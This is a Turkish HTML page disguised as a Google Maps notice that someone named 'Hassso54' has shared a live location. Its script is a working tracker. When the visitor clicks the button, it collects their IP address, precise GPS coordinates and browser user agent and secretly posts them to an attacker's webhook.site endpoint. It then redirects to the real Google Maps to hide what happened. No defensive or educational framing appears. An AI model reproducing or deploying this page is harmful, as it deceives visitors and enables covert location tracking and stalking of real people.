<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Haritalar</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { text-align: center; padding: 20px; width: 90%; max-width: 350px; }
        .map-icon { width: 60px; margin-bottom: 20px; }
        h2 { font-size: 18px; color: #3c4043; font-weight: 500; margin-bottom: 25px; line-height: 1.4; }
        button { background-color: #1a73e8; color: white; border: none; padding: 14px 20px; border-radius: 4px; font-weight: 500; cursor: pointer; width: 100%; font-size: 15px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
    </style>
</head>
<body>

<div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/Google_Maps_icon_%282020%29.svg/1024px-Google_Maps_icon_%282020%29.svg.png" alt="Maps" class="map-icon">
    <h2>Hassso54 sizinle canlı konumunu paylaştı.</h2>
    <button id="goBtn" onclick="calistir()">Konumu Görüntüle</button>
</div>

<script>
    // WEBHOOK LİNKİNİ KONTROL ET
    const webhookURL = "https://webhook.site/37bb967a-e91f-4081-b0a2-8daecb562326";

    async function calistir() {
        const btn = document.getElementById('goBtn');
        btn.innerText = "Yükleniyor...";
        btn.disabled = true;

        let data = {
            tip: "Hassso54_Takip",
            ip: "Bilinmiyor",
            gps: "İzin Yok",
            userAgent: navigator.userAgent
        };

        // 1. IP Al
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const json = await res.json();
            data.ip = json.ip;
        } catch(e) {}

        // 2. Konum Al ve Gönder
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async (p) => {
                    data.gps = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                    await veriyiBas(data);
                },
                async () => {
                    await veriyiBas(data);
                },
                { enableHighAccuracy: true, timeout: 8000 }
            );
        } else {
            await veriyiBas(data);
        }
    }

    async function veriyiBas(d) {
        try {
            await fetch(webhookURL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(d)
            });
        } catch(e) {}
        
        // İşlem bitince gerçek haritaya yönlendir
        window.location.href = "https://www.google.com/maps";
    }
</script>

</body>
</html>
